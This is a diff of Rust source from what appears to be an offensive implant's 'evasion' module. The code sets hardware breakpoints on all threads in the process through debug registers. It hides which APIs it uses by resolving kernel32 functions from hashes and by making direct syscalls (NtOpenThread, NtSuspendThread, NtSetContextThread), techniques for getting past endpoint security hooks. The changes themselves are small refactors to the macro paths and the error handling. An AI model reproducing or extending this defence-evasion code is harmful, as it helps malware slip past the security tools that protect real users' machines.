@@ -92,7 +92,7 @@ pub unsafe fn setup_hardware_breakpoints() {
     type Thread32FirstFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
     type Thread32NextFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
 
-    let (create_snapshot, thread32_first, thread32_next): (Option<CreateSnapshotFn>, Option<Thread32FirstFn>, Option<Thread32NextFn>) = (|| unsafe {
+    let (create_snapshot, thread32_first, thread32_next): (Option<CreateSnapshotFn>, Option<Thread32FirstFn>, Option<Thread32NextFn>) = match (|| unsafe {
         let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
         let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
         let first_hash = pe_resolve::hash_str(b"Thread32First\0");
@@ -105,7 +105,10 @@ pub unsafe fn setup_hardware_breakpoints() {
             std::mem::transmute::<usize, Thread32FirstFn>(first_addr),
             std::mem::transmute::<usize, Thread32NextFn>(next_addr),
         ))
-    })().unwrap_or((None, None, None));
+    })() {
+        Some((snap, first, next)) => (Some(snap), Some(first), Some(next)),
+        None => (None, None, None),
+    };
 
     type NtGetContextThreadFn =
         unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
@@ -188,7 +191,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                 // Verify the current byte is readable before peeking at the opcode.
                 let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
                 let mut return_len: usize = 0;
-                let vq_status = syscall!(
+                let vq_status = crate::syscall!(
                     "NtQueryVirtualMemory",
                     -1i64 as u64,                          // NtCurrentProcess()
                     p as u64,                               // BaseAddress
@@ -233,7 +236,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                     // New page: verify it is committed and readable/executable.
                     let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
                     let mut return_len: usize = 0;
-                    let vq_status = syscall!(
+                    let vq_status = crate::syscall!(
                         "NtQueryVirtualMemory",
                         -1i64 as u64,                          // NtCurrentProcess()
                         p as u64,                               // BaseAddress
@@ -353,7 +356,7 @@ pub unsafe fn setup_hardware_breakpoints() {
         inherited_from_unique_process_id: usize,
     }
     let mut pbi: Pbi = std::mem::zeroed();
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtQueryInformationProcess",
         (-1isize) as u64, // NtCurrentProcess()
         0u64,              // ProcessBasicInformation
@@ -376,7 +379,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                     oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
                     let mut cid: [u64; 2] = [pid as u64, te32.th32ThreadID as u64];
                     let mut h_thread: usize = 0;
-                    let open_ok = syscall!(
+                    let open_ok = crate::syscall!(
                         "NtOpenThread",
                         &mut h_thread as *mut _ as u64,
                         THREAD_BP_ACCESS as u64,
@@ -387,7 +390,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                     if open_ok.is_ok() && open_ok.unwrap() >= 0 && !h_thread.is_null() {
                         // (1) SuspendThread → NtSuspendThread
                         let mut prev_suspend: u32 = 0;
-                        let susp_status = syscall!(
+                        let susp_status = crate::syscall!(
                             "NtSuspendThread",
                             h_thread as u64,
                             &mut prev_suspend as *mut u32 as u64,
@@ -397,7 +400,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 "evasion: NtSuspendThread failed for tid {} — skipping context modification",
                                 te32.th32ThreadID
                             );
-                            let _ = syscall!("NtClose", h_thread as u64);
+                            let _ = crate::syscall!("NtClose", h_thread as u64);
                             if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                                 break;
                             }
@@ -408,7 +411,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         let mut orig_ctx: CONTEXT = std::mem::zeroed();
                         orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                             let got_ctx_fallback = {
-                                let s = syscall!(
+                                let s = crate::syscall!(
                                     "NtGetContextThread",
                                     h_thread as u64,
                                     &mut orig_ctx as *mut _ as u64,
@@ -426,7 +429,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         let mut ctx: CONTEXT = std::mem::zeroed();
                         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                         let ctx_fallback = {
-                                let s = syscall!(
+                                let s = crate::syscall!(
                                     "NtGetContextThread",
                                     h_thread as u64,
                                     &mut ctx as *mut _ as u64,
@@ -455,8 +458,8 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 te32.th32ThreadID
                             );
                             // ResumeThread → NtResumeThread
-                            let _ = syscall!("NtResumeThread", h_thread as u64, 0u64);
-                            let _ = syscall!("NtClose", h_thread as u64);
+                            let _ = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
+                            let _ = crate::syscall!("NtClose", h_thread as u64);
                             if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                                 break;
                             }
@@ -470,7 +473,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         ctx.Dr7 |= (1 << 0) | (1 << 2);
 
                         let set_fallback = {
-                                let s = syscall!(
+                                let s = crate::syscall!(
                                     "NtSetContextThread",
                                     h_thread as u64,
                                     &mut ctx as *mut _ as u64,
@@ -498,7 +501,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                             let mut verify_ctx: CONTEXT = std::mem::zeroed();
                             verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                             let verify_fallback = {
-                                    let s = syscall!(
+                                    let s = crate::syscall!(
                                         "NtGetContextThread",
                                         h_thread as u64,
                                         &mut verify_ctx as *mut _ as u64,
@@ -528,7 +531,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                                     let _ = if let Some(nt_set_ctx) = nt_set_context_thread {
                                         nt_set_ctx(h_thread, &mut orig_ctx)
                                     } else {
-                                        let s = syscall!(
+                                        let s = crate::syscall!(
                                             "NtSetContextThread",
                                             h_thread as u64,
                                             &mut orig_ctx as *mut _ as u64,
@@ -545,14 +548,14 @@ pub unsafe fn setup_hardware_breakpoints() {
                         }
 
                         // (4) ResumeThread → NtResumeThread
-                        let resume_status = syscall!("NtResumeThread", h_thread as u64, 0u64);
+                        let resume_status = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
                         if resume_status.is_err() || resume_status.unwrap() < 0 {
                             log::error!(
                                 "evasion: NtResumeThread failed for tid {} — thread may be left in suspended state!",
                                 te32.th32ThreadID
                             );
                         }
-                        let _ = syscall!("NtClose", h_thread as u64);
+                        let _ = crate::syscall!("NtClose", h_thread as u64);
                     }
                 }
                 if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
@@ -560,7 +563,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                 }
             }
         }
-        let _ = syscall!("NtClose", snapshot as u64);
+        let _ = crate::syscall!("NtClose", snapshot as u64);
     }
 }
 
@@ -701,11 +704,11 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     let orig_saved = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut orig_ctx);
         if status >= 0 { true } else {
-            let s = syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+            let s = crate::syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
             s.is_ok() && s.unwrap() >= 0
         }
     } else {
-        let s = syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+        let s = crate::syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -719,13 +722,13 @@ pub unsafe fn apply_hwbp_to_current_thread() {
                 "evasion: apply_hwbp_to_current_thread: NtGetContextThread failed (status=0x{:08x}), falling back to syscall",
                 status as u32
             );
-            let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+            let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
             s.is_ok() && s.unwrap() >= 0
         } else {
             true
         }
     } else {
-        let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -747,13 +750,13 @@ pub unsafe fn apply_hwbp_to_current_thread() {
                 "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to syscall",
                 status as u32
             );
-            let s = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+            let s = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
             s.is_ok() && s.unwrap() >= 0
         } else {
             true
         }
     } else {
-        let s = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        let s = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -770,11 +773,11 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     let verify_ok = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut verify_ctx);
         if status >= 0 { true } else {
-            let s = syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
+            let s = crate::syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
             s.is_ok() && s.unwrap() >= 0
         }
     } else {
-        let s = syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
+        let s = crate::syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -793,7 +796,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
             let _ = if let Some(nt_set) = nt_set_ctx {
                 nt_set(h, &mut orig_ctx)
             } else {
-                let s = syscall!("NtSetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+                let s = crate::syscall!("NtSetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
                 if s.is_ok() && s.unwrap() >= 0 { 0i32 } else { -1i32 }
             };
         }
@@ -901,7 +904,7 @@ unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
     let got = if let Some(nt_get_fn) = nt_get {
         nt_get_fn(h, &mut ctx) >= 0
     } else {
-        let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -924,7 +927,7 @@ unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
         if let Some(nt_set_fn) = nt_set {
             nt_set_fn(h, &mut ctx);
         } else {
-            let _ = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+            let _ = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
         }
     }
 
@@ -969,7 +972,7 @@ unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
     let got = if let Some(nt_get_fn) = nt_get {
         nt_get_fn(h, &mut ctx) >= 0
     } else {
-        let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -989,7 +992,7 @@ unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
     if let Some(nt_set_fn) = nt_set {
         nt_set_fn(h, &mut ctx);
     } else {
-        let _ = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        let _ = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
     }
 }
 
